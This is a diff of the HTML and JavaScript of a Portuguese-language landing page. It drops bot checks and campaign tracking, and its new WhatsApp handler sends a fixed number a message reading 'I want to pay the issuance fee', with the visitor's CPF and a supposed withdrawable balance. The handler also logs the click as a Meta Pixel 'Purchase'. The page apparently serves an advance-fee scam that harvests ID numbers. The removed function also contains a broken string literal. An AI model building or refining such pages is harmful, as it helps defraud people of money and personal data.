@@ -39,34 +39,6 @@ fbq('track', 'PageView');
 src="https://www.facebook.com/tr?id=1119253847528378&ev=PageView&noscript=1"
 /></noscript>
 <!-- End Meta Pixel Code -->
-    
-<script
-  src="https://challenges.cloudflare.com/turnstile/v0/api.js"
-  async
-  defer>
-</script>
-
-<script>
-(function () {
-  const parametros = new URLSearchParams(window.location.search);
-
-  const campos = {
-    utm_campaign: "campanha_id",
-    utm_term: "conjunto_id",
-    utm_content: "anuncio_id",
-    fbclid: "fbclid"
-  };
-
-  for (const [parametro, campo] of Object.entries(campos)) {
-    const valor = parametros.get(parametro);
-
-    if (valor && /^[a-zA-Z0-9_.-]{1,200}$/.test(valor)) {
-      sessionStorage.setItem(campo, valor);
-    }
-  }
-})();
-</script>
-
 </head>
 <body class="bg-slate-100 min-h-screen flex flex-col justify-between font-sans text-base antialiased" onload="carregarDepoimentosDinamicos()">
 
@@ -305,13 +277,6 @@ src="https://www.facebook.com/tr?id=1119253847528378&ev=PageView&noscript=1"
 
             <div class="space-y-2.5">
                 <!-- Botão final que dispara para o WhatsApp -->
-                
-<div
-  class="cf-turnstile"
-  data-sitekey="0x4AAAAAAGAXjVdYe9Sdh3xy"
-  data-theme="light">
-</div>
-
                 <a id="modal-btn-zap" href="#" onclick="dispararWhatsApp(event)" target="_blank"
                     class="w-full bg-slate-300 text-slate-500 font-bold py-3.5 rounded-xl transition duration-200 text-sm flex items-center justify-center space-x-2 cursor-not-allowed pointer-events-none no-underline shadow-sm">
                     <span>➡️ Ir para o WhatsApp Agora</span>
@@ -595,78 +560,26 @@ src="https://www.facebook.com/tr?id=1119253847528378&ev=PageView&noscript=1"
             }
         }
 
-        
-async function dispararWhatsApp(event) {
-  event.preventDefault();
+        function dispararWhatsApp(event) {
+            let marcado = document.getElementById('modal-check').checked;
+            if (!marcado) {
+                event.preventDefault();
+                return;
+            }
 
-  const botao = event.currentTarget;
-  const checkbox = document.getElementById("modal-check");
+            if (typeof fbq === 'function') {
+                fbq('track', 'Purchase');
+            }
 
-  if (!checkbox || !checkbox.checked) {
-    alert("Confirme a autorização para continuar.");
-    return;
-  }
+            const numerosWhatsApp = ["5516981539469"];
+            let numeroSorteado = numerosWhatsApp[Math.floor(Math.random() * numerosWhatsApp.length)];
 
-  const token = window.turnstile?.getResponse();
+            let textoMensagem = `Oi quero pagar a taxa de emissao. Meu CPF é ${cpfGlobal} e tenho o valor de ${valorGlobal} disponível para saque.`;
+            let mensagemCodificada = encodeURIComponent(textoMensagem);
 
-  if (!token) {
-    alert("Conclua a verificação de segurança.");
-    return;
-  }
-
-  if (botao.dataset.enviando === "true") return;
-
-  botao.dataset.enviando = "true";
-  botao.style.pointerEvents = "none";
-
-  try {
-    const resposta = await fetch("/api/atendimento", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-  token,
-  campanha_id: sessionStorage.getItem("campanha_id"),
-  conjunto_id: sessionStorage.getItem("conjunto_id"),
-  anuncio_id: sessionStorage.getItem("anuncio_id"),
-  fbclid: sessionStorage.getItem("fbclid")
-})
-    });
-
-    const resultado = await resposta.json();
-
-    if (!resposta.ok || !resultado.sucesso) {
-      throw new Error(
-        resultado.erro || "Não foi possível registrar"
-      );
-    }
-
-    if (typeof fbq === "function") {
-      fbq("trackCustom", "WhatsAppClick");
-    }
-
-    const numero = "5516981539469";
-
-    const mensagem = encodeURIComponent(
-      "Olá! Gostaria de dar continuidade ao meu atendimento.
-        Protocolo: [resultado.codigo]
-        CPF: [cpfGlobal]
-        Valor de Saque: [valorGlobal]
-    );
-
-    window.location.href =
-      `https://wa.me/${numero}?text=${mensagem}`;
-
-  } catch (erro) {
-    alert(erro.message);
-    window.turnstile?.reset();
-  } finally {
-    botao.dataset.enviando = "false";
-    botao.style.pointerEvents = "";
-  }
-}
- 
+            let linkZap = `https://wa.me/${numeroSorteado}?text=${mensagemCodificada}`;
+            event.currentTarget.href = linkZap;
+        }
     </script>
 </body>
 </html>
